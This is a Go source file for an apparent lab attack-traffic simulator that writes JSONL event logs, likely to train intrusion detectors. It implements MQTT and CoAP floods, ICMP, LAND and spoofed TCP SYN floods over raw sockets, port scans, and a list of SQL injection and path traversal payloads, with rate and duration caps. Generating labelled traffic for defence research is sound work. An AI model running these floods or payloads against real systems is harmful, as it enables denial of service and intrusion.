package main

import (
	"bytes"
	"context"
	"crypto/rand"
	"encoding/binary"
	"flag"
	"fmt"
	"io"
	"math"
	mrand "math/rand"
	"net"
	"net/http"
	"os"
	"strconv"
	"strings"
	"time"

	mqtt "github.com/eclipse/paho.mqtt.golang"
	"github.com/plgd-dev/go-coap/v3/message"
	"github.com/plgd-dev/go-coap/v3/message/codes"
	"github.com/plgd-dev/go-coap/v3/options"
	coapudp "github.com/plgd-dev/go-coap/v3/udp"
	"golang.org/x/sys/unix"

	"attacker_simulate/internal/attack"
)

type stringList []string

func (s *stringList) String() string {
	return strings.Join(*s, ",")
}

func (s *stringList) Set(value string) error {
	for _, item := range strings.Split(value, ",") {
		item = strings.TrimSpace(item)
		if item != "" {
			*s = append(*s, item)
		}
	}
	return nil
}

func main() {
	var explicitSourceIPs stringList
	var scenario string
	var level string
	var target string
	var sourceCIDR string
	var sourceIPFile string
	var out string
	var portsSpec string
	var duration time.Duration
	var waitSources time.Duration
	var rate int
	var mqttPort int
	var coapPort int
	var httpPort int
	var tcpPort int
	var payloadBytes int
	var slowConnections int

	flag.StringVar(&scenario, "attack", attack.ScenarioMQTTPublishFlood, "Attack scenario")
	flag.StringVar(&level, "level", attack.LevelSmoke, "Scenario level: smoke, training, evaluation")
	flag.StringVar(&target, "target", "host.minikube.internal", "Lab target host or IP")
	flag.Var(&explicitSourceIPs, "source-ip", "UE source IP to bind/spoof from; may be repeated or comma-separated")
	flag.StringVar(&sourceIPFile, "source-ip-file", "", "File containing UE source IPs, one per line")
	flag.StringVar(&sourceCIDR, "source-cidr", "12.1.0.0/16", "CIDR used for automatic UE source IP discovery and random-source variants")
	flag.DurationVar(&duration, "duration", 0, "Attack duration; capped at 60s")
	flag.IntVar(&rate, "rate", 0, "Packet/message/connect attempts per second; capped at 500")
	flag.IntVar(&mqttPort, "mqtt-port", 1883, "MQTT target port")
	flag.IntVar(&coapPort, "coap-port", 5683, "CoAP target UDP port")
	flag.IntVar(&httpPort, "http-port", 8088, "HTTP target port for SQLmap-like traffic")
	flag.IntVar(&tcpPort, "tcp-port", 80, "TCP target port for SYN flood")
	flag.StringVar(&portsSpec, "ports", "", "Port list/ranges for scan, for example 22,80,1883,5683 or 1-1024")
	flag.IntVar(&payloadBytes, "payload-bytes", 256, "Generated payload bytes")
	flag.IntVar(&slowConnections, "slow-connections", 0, "MQTT SlowITe-like idle connection count; capped at 100")
	flag.DurationVar(&waitSources, "wait-sources", 60*time.Second, "Time to wait for auto-discovered UE source IPs")
	flag.StringVar(&out, "out", "attacker_events.jsonl", "JSONL attacker event output path, or '-' for stdout")
	flag.Parse()

	if err := attack.ValidateScenario(scenario); err != nil {
		fatal(err)
	}
	normalizedLevel, err := attack.NormalizeLevel(level)
	if err != nil {
		fatal(err)
	}
	duration, rate, slowConnections = attack.ApplyLevelDefaults(normalizedLevel, duration, rate, slowConnections)
	duration, rate, slowConnections = attack.EnforceSafety(duration, rate, slowConnections)
	if payloadBytes < 64 {
		payloadBytes = 64
	}
	if payloadBytes > 4096 {
		payloadBytes = 4096
	}

	targetIP, err := attack.ResolveLabTarget(target)
	if err != nil {
		fatal(err)
	}
	sourceIPs, err := attack.WaitForSourceIPs(sourceCIDR, explicitSourceIPs, sourceIPFile, waitSources)
	if err != nil {
		fatal(err)
	}
	ports, err := scanPortsForScenario(scenario, portsSpec)
	if err != nil {
		fatal(err)
	}

	cfg := attack.Config{
		Scenario:        scenario,
		Level:           normalizedLevel,
		Target:          target,
		TargetIP:        targetIP,
		SourceIPs:       sourceIPs,
		SourceCIDR:      sourceCIDR,
		Duration:        duration,
		RatePerSecond:   rate,
		MQTTPort:        mqttPort,
		CoAPPort:        coapPort,
		HTTPPort:        httpPort,
		TCPPort:         tcpPort,
		Ports:           ports,
		PayloadBytes:    payloadBytes,
		SlowConnections: slowConnections,
		Out:             out,
	}

	logger, err := attack.NewEventLogger(out)
	if err != nil {
		fatal(err)
	}
	defer logger.Close()

	ctx, cancel := context.WithTimeout(context.Background(), cfg.Duration)
	defer cancel()

	_ = logger.Write(attack.Event{
		Role:     "attacker",
		Event:    "attack_started",
		Scenario: cfg.Scenario,
		Level:    cfg.Level,
		Target:   cfg.Target,
		TargetIP: cfg.TargetIP,
		Status:   "ok",
		Fields: map[string]any{
			"duration":         cfg.Duration.String(),
			"rate_per_second":  cfg.RatePerSecond,
			"source_ips":       cfg.SourceIPs,
			"source_cidr":      cfg.SourceCIDR,
			"ports":            cfg.Ports,
			"slow_connections": cfg.SlowConnections,
		},
	})

	count, err := runScenario(ctx, cfg, logger)
	status := "ok"
	errText := ""
	if err != nil {
		status = "error"
		errText = err.Error()
	}
	_ = logger.Write(attack.Event{
		Role:     "attacker",
		Event:    "attack_completed",
		Scenario: cfg.Scenario,
		Level:    cfg.Level,
		Target:   cfg.Target,
		TargetIP: cfg.TargetIP,
		Count:    count,
		Status:   status,
		Error:    errText,
	})
	if err != nil {
		os.Exit(1)
	}
}

func scanPortsForScenario(scenario string, spec string) ([]int, error) {
	switch scenario {
	case attack.ScenarioShortPortScan:
		return attack.ParsePorts(spec, attack.CommonShortPorts())
	case attack.ScenarioPortScan:
		return attack.ParsePorts(spec, defaultPortRange(1, 1024))
	default:
		return attack.ParsePorts(spec, nil)
	}
}

func defaultPortRange(start, end int) []int {
	out := make([]int, 0, end-start+1)
	for port := start; port <= end; port++ {
		out = append(out, port)
	}
	return out
}

func runScenario(ctx context.Context, cfg attack.Config, logger *attack.EventLogger) (int, error) {
	switch cfg.Scenario {
	case attack.ScenarioMQTTPublishFlood:
		return runMQTTPublishFlood(ctx, cfg, logger)
	case attack.ScenarioMQTTSlowITe:
		return runMQTTSlowITe(ctx, cfg, logger)
	case attack.ScenarioCoAPPutFlood:
		return runCoAPPutFlood(ctx, cfg, logger)
	case attack.ScenarioICMPFlood:
		return runICMPFlood(ctx, cfg, logger, false)
	case attack.ScenarioLANDPingFlood:
		return runICMPFlood(ctx, cfg, logger, true)
	case attack.ScenarioTCPSYNFlood:
		return runTCPSYNFlood(ctx, cfg, logger, false)
	case attack.ScenarioRandomSourceTCPSYNFlood:
		return runTCPSYNFlood(ctx, cfg, logger, true)
	case attack.ScenarioPortScan, attack.ScenarioShortPortScan:
		return runPortScan(ctx, cfg, logger)
	case attack.ScenarioSQLMapLike:
		return runSQLMapLike(ctx, cfg, logger)
	default:
		return 0, fmt.Errorf("unsupported scenario %q", cfg.Scenario)
	}
}

func runMQTTPublishFlood(ctx context.Context, cfg attack.Config, logger *attack.EventLogger) (int, error) {
	sourceIP := cfg.SourceIPs[0]
	ip := net.ParseIP(sourceIP)
	opts := mqtt.NewClientOptions().
		AddBroker("tcp://" + net.JoinHostPort(cfg.Target, strconv.Itoa(cfg.MQTTPort))).
		SetClientID("attacker-mqtt-flood-" + randomHex(4)).
		SetCleanSession(true).
		SetConnectTimeout(5 * time.Second)
	opts.SetDialer(&net.Dialer{Timeout: 5 * time.Second, LocalAddr: &net.TCPAddr{IP: ip}})
	client := mqtt.NewClient(opts)
	token := client.Connect()
	token.Wait()
	if token.Error() != nil {
		return 0, token.Error()
	}
	defer client.Disconnect(250)

	limiter := attack.NewLimiter(cfg.RatePerSecond)
	defer limiter.Stop()
	count := 0
	for limiter.Wait(ctx) {
		payload := attack.GeneratePayload(cfg, sourceIP, count)
		token := client.Publish("attack/mqtt/publish-flood/"+sourceIP, 0, false, payload)
		token.Wait()
		if token.Error() != nil {
			return count, token.Error()
		}
		count++
		writeAttempt(logger, cfg, attack.ProtocolMQTT, sourceIP, cfg.MQTTPort, len(payload), count, "ok", "")
	}
	return count, nil
}

func runMQTTSlowITe(ctx context.Context, cfg attack.Config, logger *attack.EventLogger) (int, error) {
	clients := make([]mqtt.Client, 0, cfg.SlowConnections)
	for i := 0; i < cfg.SlowConnections; i++ {
		sourceIP := cfg.SourceIPs[i%len(cfg.SourceIPs)]
		ip := net.ParseIP(sourceIP)
		opts := mqtt.NewClientOptions().
			AddBroker("tcp://" + net.JoinHostPort(cfg.Target, strconv.Itoa(cfg.MQTTPort))).
			SetClientID(fmt.Sprintf("attacker-mqtt-slowite-%s-%03d-%s", sourceIP, i, randomHex(2))).
			SetCleanSession(false).
			SetKeepAlive(10 * time.Minute).
			SetPingTimeout(30 * time.Second).
			SetConnectTimeout(5 * time.Second)
		opts.SetDialer(&net.Dialer{Timeout: 5 * time.Second, LocalAddr: &net.TCPAddr{IP: ip}})
		client := mqtt.NewClient(opts)
		token := client.Connect()
		token.Wait()
		if token.Error() != nil {
			disconnectMQTTClients(clients)
			return i, token.Error()
		}
		clients = append(clients, client)
		writeAttempt(logger, cfg, attack.ProtocolMQTT, sourceIP, cfg.MQTTPort, 0, i+1, "connected", "")
	}
	defer disconnectMQTTClients(clients)

	limiter := attack.NewLimiter(max(1, int(math.Min(float64(cfg.RatePerSecond), float64(len(clients))))))
	defer limiter.Stop()
	count := 0
	for limiter.Wait(ctx) {
		idx := count % len(clients)
		sourceIP := cfg.SourceIPs[idx%len(cfg.SourceIPs)]
		payload := attack.GeneratePayload(cfg, sourceIP, count)
		token := clients[idx].Publish("attack/mqtt/slowite/"+sourceIP, 0, false, payload[:min(len(payload), 32)])
		token.Wait()
		if token.Error() != nil {
			return count, token.Error()
		}
		count++
		writeAttempt(logger, cfg, attack.ProtocolMQTT, sourceIP, cfg.MQTTPort, min(len(payload), 32), count, "ok", "")
	}
	return count, nil
}

func disconnectMQTTClients(clients []mqtt.Client) {
	for _, client := range clients {
		if client != nil && client.IsConnected() {
			client.Disconnect(250)
		}
	}
}

func runCoAPPutFlood(ctx context.Context, cfg attack.Config, logger *attack.EventLogger) (int, error) {
	sourceIP := cfg.SourceIPs[0]
	conn, err := coapudp.Dial(
		net.JoinHostPort(cfg.Target, strconv.Itoa(cfg.CoAPPort)),
		options.WithDialer(&net.Dialer{Timeout: 5 * time.Second, LocalAddr: &net.UDPAddr{IP: net.ParseIP(sourceIP)}}),
	)
	if err != nil {
		return 0, err
	}
	defer conn.Close()

	limiter := attack.NewLimiter(cfg.RatePerSecond)
	defer limiter.Stop()
	count := 0
	for limiter.Wait(ctx) {
		payload := attack.GeneratePayload(cfg, sourceIP, count)
		resp, err := conn.Put(ctx, "/attack/coap/put-flood/"+sourceIP, message.AppJSON, bytes.NewReader(payload))
		if err != nil {
			return count, err
		}
		if resp.Code() >= codes.BadRequest {
			return count, fmt.Errorf("coap response %s", resp.Code())
		}
		count++
		writeAttempt(logger, cfg, attack.ProtocolCoAP, sourceIP, cfg.CoAPPort, len(payload), count, "ok", "")
	}
	return count, nil
}

func runICMPFlood(ctx context.Context, cfg attack.Config, logger *attack.EventLogger, land bool) (int, error) {
	targetIP := net.ParseIP(cfg.TargetIP).To4()
	fd, err := unix.Socket(unix.AF_INET, unix.SOCK_RAW, unix.IPPROTO_RAW)
	if err != nil {
		return 0, fmt.Errorf("open raw ICMP socket: %w", err)
	}
	defer unix.Close(fd)

	limiter := attack.NewLimiter(cfg.RatePerSecond)
	defer limiter.Stop()
	count := 0
	for limiter.Wait(ctx) {
		sourceIP := cfg.SourceIPs[count%len(cfg.SourceIPs)]
		src := net.ParseIP(sourceIP).To4()
		if land {
			src = targetIP
			sourceIP = targetIP.String()
		}
		payload := attack.GeneratePayload(cfg, sourceIP, count)
		packet := attack.BuildIPv4ICMPEcho(src, targetIP, os.Getpid()&0xffff, count&0xffff, payload)
		if err := sendRawIPv4(fd, targetIP, packet); err != nil {
			return count, err
		}
		count++
		writeAttempt(logger, cfg, attack.ProtocolICMP, sourceIP, 0, len(payload), count, "ok", "")
	}
	return count, nil
}

func runTCPSYNFlood(ctx context.Context, cfg attack.Config, logger *attack.EventLogger, randomSource bool) (int, error) {
	targetIP := net.ParseIP(cfg.TargetIP).To4()
	fd, err := unix.Socket(unix.AF_INET, unix.SOCK_RAW, unix.IPPROTO_RAW)
	if err != nil {
		return 0, fmt.Errorf("open raw TCP socket: %w", err)
	}
	defer unix.Close(fd)

	limiter := attack.NewLimiter(cfg.RatePerSecond)
	defer limiter.Stop()
	count := 0
	for limiter.Wait(ctx) {
		sourceIP := cfg.SourceIPs[count%len(cfg.SourceIPs)]
		src := net.ParseIP(sourceIP).To4()
		if randomSource {
			src = attack.RandomIPInCIDR(cfg.SourceCIDR).To4()
			sourceIP = src.String()
		}
		packet := attack.BuildIPv4TCPSYN(src, targetIP, 1024+mrand.Intn(50000), cfg.TCPPort, mrand.Uint32())
		if err := sendRawIPv4(fd, targetIP, packet); err != nil {
			return count, err
		}
		count++
		writeAttempt(logger, cfg, attack.ProtocolTCP, sourceIP, cfg.TCPPort, len(packet), count, "ok", "")
	}
	return count, nil
}

func runPortScan(ctx context.Context, cfg attack.Config, logger *attack.EventLogger) (int, error) {
	sourceIP := cfg.SourceIPs[0]
	ip := net.ParseIP(sourceIP)
	limiter := attack.NewLimiter(cfg.RatePerSecond)
	defer limiter.Stop()
	count := 0
	for _, port := range cfg.Ports {
		if !limiter.Wait(ctx) {
			return count, nil
		}
		dialCtx, cancel := context.WithTimeout(ctx, 750*time.Millisecond)
		dialer := net.Dialer{Timeout: 750 * time.Millisecond, LocalAddr: &net.TCPAddr{IP: ip}}
		conn, err := dialer.DialContext(dialCtx, "tcp", net.JoinHostPort(cfg.Target, strconv.Itoa(port)))
		cancel()
		status := "closed"
		errText := ""
		if err == nil {
			status = "open"
			_ = conn.Close()
		} else {
			errText = err.Error()
		}
		count++
		writeAttempt(logger, cfg, attack.ProtocolTCP, sourceIP, port, 0, count, status, errText)
	}
	return count, nil
}

func runSQLMapLike(ctx context.Context, cfg attack.Config, logger *attack.EventLogger) (int, error) {
	sourceIP := cfg.SourceIPs[0]
	client := &http.Client{
		Timeout: 5 * time.Second,
		Transport: &http.Transport{
			DialContext: (&net.Dialer{
				Timeout:   3 * time.Second,
				LocalAddr: &net.TCPAddr{IP: net.ParseIP(sourceIP)},
			}).DialContext,
		},
	}
	payloads := []string{
		"' OR '1'='1",
		"1 UNION SELECT NULL",
		"admin'--",
		"1;SELECT pg_sleep(1)",
		"1) OR (1=1)--",
		"../../etc/passwd",
	}
	limiter := attack.NewLimiter(cfg.RatePerSecond)
	defer limiter.Stop()
	count := 0
	for limiter.Wait(ctx) {
		value := payloads[count%len(payloads)]
		url := "http://" + net.JoinHostPort(cfg.Target, strconv.Itoa(cfg.HTTPPort)) + "/search?id=" + urlQueryEscape(value)
		req, err := http.NewRequestWithContext(ctx, http.MethodGet, url, nil)
		if err != nil {
			return count, err
		}
		req.Header.Set("User-Agent", "sqlmap/controlled-lab-simulator")
		resp, err := client.Do(req)
		status := "ok"
		errText := ""
		if err != nil {
			status = "error"
			errText = err.Error()
		} else {
			_, _ = io.Copy(io.Discard, resp.Body)
			_ = resp.Body.Close()
			status = strconv.Itoa(resp.StatusCode)
		}
		count++
		writeAttempt(logger, cfg, attack.ProtocolHTTP, sourceIP, cfg.HTTPPort, len(value), count, status, errText)
	}
	return count, nil
}

func sendRawIPv4(fd int, targetIP net.IP, packet []byte) error {
	ip := targetIP.To4()
	if ip == nil {
		return fmt.Errorf("invalid raw target IP %v", targetIP)
	}
	addr := unix.SockaddrInet4{}
	copy(addr.Addr[:], ip)
	return unix.Sendto(fd, packet, 0, &addr)
}

func writeAttempt(logger *attack.EventLogger, cfg attack.Config, protocol string, sourceIP string, port int, payloadSize int, count int, status string, errText string) {
	_ = logger.Write(attack.Event{
		Role:        "attacker",
		Event:       "attack_attempt",
		Scenario:    cfg.Scenario,
		Level:       cfg.Level,
		Protocol:    protocol,
		SourceIP:    sourceIP,
		Target:      cfg.Target,
		TargetIP:    cfg.TargetIP,
		Port:        port,
		PayloadSize: payloadSize,
		Count:       count,
		Status:      status,
		Error:       errText,
	})
}

func randomHex(bytesLen int) string {
	b := make([]byte, bytesLen)
	if _, err := rand.Read(b); err != nil {
		return fmt.Sprintf("%08x", time.Now().UnixNano())
	}
	return fmt.Sprintf("%x", b)
}

func urlQueryEscape(value string) string {
	replacer := strings.NewReplacer(
		" ", "+",
		"'", "%27",
		"\"", "%22",
		";", "%3B",
		"=", "%3D",
		"/", "%2F",
		"(", "%28",
		")", "%29",
	)
	return replacer.Replace(value)
}

func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}

func max(a, b int) int {
	if a > b {
		return a
	}
	return b
}

func init() {
	var seedBytes [8]byte
	if _, err := rand.Read(seedBytes[:]); err == nil {
		mrand.Seed(int64(binary.BigEndian.Uint64(seedBytes[:])))
	}
}

func fatal(err error) {
	fmt.Fprintln(os.Stderr, "attacker-client:", err)
	os.Exit(1)
}
